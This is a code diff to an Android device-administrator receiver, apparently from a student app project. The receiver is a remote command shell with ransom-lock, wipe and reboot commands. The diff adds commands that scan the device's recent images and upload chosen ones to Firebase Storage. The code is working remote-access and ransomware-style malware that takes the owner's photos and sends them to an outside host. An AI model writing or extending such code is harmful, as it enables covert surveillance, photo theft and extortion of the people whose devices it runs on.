@@ -19,10 +19,12 @@ import android.util.Log;
 import android.view.Gravity;
 import android.view.WindowManager;
 import android.widget.TextView;
+import com.example.inf2007_mad_j1847.test.MediaCollector;
 
 import java.io.IOException;
 import java.net.Socket;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 
@@ -84,6 +86,8 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 writer.println("  reboot (not working on emulator)     - Reboot device");
                 writer.println("  ransom_lock - set max idle time lock");
                 writer.println("  ransom_end ");
+                writer.println("  scan_media [N]  - Scan N images and show results");
+                writer.println("  upload [ID]     - Upload image to Firebase Storage");
                 writer.println("  exit        - Close connection");
                 writer.println("  wipe  (not working on emulator)      - Factory reset device (physical only)");
 
@@ -115,6 +119,73 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
     }
 
     private String handleCommand(Context context, String command) {
+
+        if (command.toLowerCase().startsWith("scan_media")) {
+            int maxItems = 10;
+            String[] parts = command.split(" ");
+            if (parts.length > 1) {
+                try {
+                    maxItems = Integer.parseInt(parts[1]);
+                } catch (NumberFormatException e) {
+                    return "❌ Invalid number. Usage: scan_media [N]";
+                }
+            }
+
+            final int finalMaxItems = maxItems;
+
+            Log.d(TAG, "Starting media scan for " + finalMaxItems + " items");
+
+            // Run scan in background and wait for result
+            final StringBuilder resultBuilder = new StringBuilder();
+
+            Thread scanThread = new Thread(() -> {
+                try {
+                    List<Map<String, String>> results = MediaCollector.scanRecentMedia(context, finalMaxItems);
+
+                    if (results.isEmpty()) {
+                        resultBuilder.append("📸 No images found.\n");
+                    } else {
+                        resultBuilder.append("✅ Found ").append(results.size()).append(" images:\n");
+                        for (int i = 0; i < results.size(); i++) {
+                            Map<String, String> item = results.get(i);
+                            resultBuilder.append("  ").append(i + 1).append(". ")
+                                    .append(item.get("name"))
+                                    .append(" [ID: ").append(item.get("id")).append("]\n");
+                        }
+                        resultBuilder.append("Use 'upload [ID]' to send to Firebase");
+                    }
+                } catch (Exception e) {
+                    resultBuilder.append("❌ Scan failed: ").append(e.getMessage());
+                    Log.e(TAG, "Scan error: " + e.getMessage());
+                }
+            });
+
+            scanThread.start();
+            try {
+                scanThread.join(10000); // Wait up to 10 seconds for scan to complete
+            } catch (InterruptedException e) {
+                return "❌ Scan timed out";
+            }
+
+            return resultBuilder.toString();
+        }
+
+        if (command.toLowerCase().startsWith("upload")) {
+            String[] parts = command.split(" ");
+            if (parts.length < 2) {
+                return "❌ Usage: upload [image_id]";
+            }
+
+            String imageId = parts[1];
+            String deviceId = context.getPackageName();
+
+            new Thread(() -> {
+                MediaCollector.uploadToFirebase(context, imageId, deviceId);
+            }).start();
+
+            return "📤 Uploading image " + imageId + " to Firebase...";
+        }
+
         switch (command.toLowerCase()) {
             case "lock":
                 lockDevice(context);
